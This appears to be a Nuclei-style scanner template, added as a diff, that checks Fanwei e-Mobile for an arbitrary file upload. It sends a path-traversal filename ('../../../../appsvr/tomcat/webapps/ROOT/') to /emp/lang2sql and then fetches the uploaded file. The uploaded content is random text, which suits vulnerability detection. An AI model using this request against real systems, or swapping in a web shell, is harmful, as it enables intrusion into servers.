@@ -1,0 +1,41 @@
+id: fanwei-e-Mobile-lang2sql-Upload
+info:
+  name: fanwei-e-Mobile-lang2sql-Upload
+  author: 公众号网络安全透视镜
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: fanwei-e-Mobile
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
+  file_content: "{{to_lower(rand_text_alpha(8))}}"
+
+requests:
+  - raw:
+      - |-
+        POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Content-Length: 197
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+        Accept-Encoding: gzip, deflate, br
+
+        ------WebKitFormBoundarymVk33liI64J7GQaK
+        Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/{{file_name}}"
+
+        {{file_content}}
+        ------WebKitFormBoundarymVk33liI64J7GQaK--
+      - |+
+        GET /{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "{{file_content}}")'
+        condition: and
